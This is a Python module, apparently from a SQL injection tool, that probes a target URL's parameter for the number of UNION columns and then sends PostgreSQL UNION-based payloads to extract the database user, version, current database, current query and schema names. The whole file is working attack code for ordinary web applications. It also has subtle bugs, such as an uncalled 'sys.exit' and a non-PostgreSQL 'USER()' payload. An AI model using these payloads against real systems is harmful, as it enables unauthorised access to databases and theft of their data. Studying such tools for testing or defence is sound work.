import requests
import sys
from colorama import Fore, Style
from utils import write_to_file, vulnerable, check_response


def test_postgresql_columns(url, http_method, data, vulnerable_field, file):
    """
    Function to test for PostgreSQL injection by checking the number of columns
    """
    base_payload = "1' UNION ALL SELECT "
    max_columns = 10
    for columns in range(1, max_columns + 1):
        payload = base_payload + ",".join(map(str, range(1, columns + 1)))
        payload += "--"
        data[vulnerable_field] = payload
        if http_method.lower() == "get":
            response = requests.get(url, params=data)
        elif http_method.lower() == "post":
            response = requests.post(url, data=data)
        else:
            print(f"{Fore.RED}[-] Invalid HTTP method{Style.RESET_ALL}")
            return
        if check_response(response):
            return columns
    print(f"{Fore.RED}[-] Number of columns not found!{Style.RESET_ALL}")
    return None


def generate_payload_psql(base_payload, columns):
    """
    Function to generate payload for PostgreSQL injection
    """
    payload_parts = base_payload.split(",")
    payload_parts += ["NULL"] * (columns - len(payload_parts))
    return "1' UNION ALL SELECT " + ",".join(payload_parts) + "--"


def send_payload_psql(url, http_method, data, vulnerable_field, payload):
    """
    Function to send payload for PostgreSQL injection
    """
    data[vulnerable_field] = payload
    if http_method.lower() == "get":
        response = requests.get(url, params=data)
    elif http_method.lower() == "post":
        response = requests.post(url, data=data)
    else:
        print(f"{Fore.RED}[-] Invalid HTTP method{Style.RESET_ALL}")
        sys.exit
    return response


def exploit_union_based_postgresql(url, http_method, data, vulnerable_field, columns, file):
    """
    Function to exploit PostgreSQL injection using UNION based method
    """
    write_to_file(
        file,
        f"[*] Exploiting PostgreSQL injection using UNION based method: {url}"
    )
    payloads = [
        "USER()",
        "USER(), NULL",
        "VERSION()",
        "VERSION(), NULL, NULL",
        "1, VERSION(), NULL",
        "1, current_user, NULL",
        "1, current_database(), NULL",
        "1, current_query(), NULL",
        "1, schema_name, NULL",
    ]
    for base_payload in payloads:
        payload = generate_payload_psql(base_payload, columns)
        response = send_payload_psql(url, http_method, data, vulnerable_field, payload)
        print(f"{Fore.GREEN}[+] {payload} - {response.text}{Style.RESET_ALL}")


def test_postgresql(url, http_method, data, vulnerable_field, file):
    """
    Wrapper function to test PostgreSQL injection
    """
    print(f"{Fore.BLUE}Testing for PostgreSQL injection...{Style.RESET_ALL}")
    write_to_file(
        file,
        f"[*] Testing for PostgreSQL injection: {url} with {http_method} method"
    )
    columns = test_postgresql_columns(url, http_method, data, vulnerable_field, file)
    if columns is None:
        return
    exploit_union_based_postgresql(url, http_method, data, vulnerable_field, columns, file)
    sys.exit(1)
